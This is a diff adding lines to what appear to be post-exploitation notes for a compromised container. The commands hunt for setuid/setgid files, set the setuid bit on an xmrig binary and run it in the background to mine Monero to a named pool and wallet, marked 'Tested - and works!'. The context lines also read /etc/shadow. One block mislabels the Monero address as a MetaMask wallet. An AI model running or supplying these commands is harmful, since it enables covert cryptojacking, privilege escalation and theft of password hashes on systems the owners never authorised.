@@ -191,6 +191,21 @@ Elevating permissions
 chmod u+s xmrig
 ```
 
+```
+find / -perm /6000 -type f
+```
+
+Tested - and works!
+```
+./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background
+```
+
+Testing - my MetaMask wallet:
+```
+./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background
+```
+
+
 Finding credentials while we are in the container:
 ```
 sudo cat /etc/shadow > /dev/null
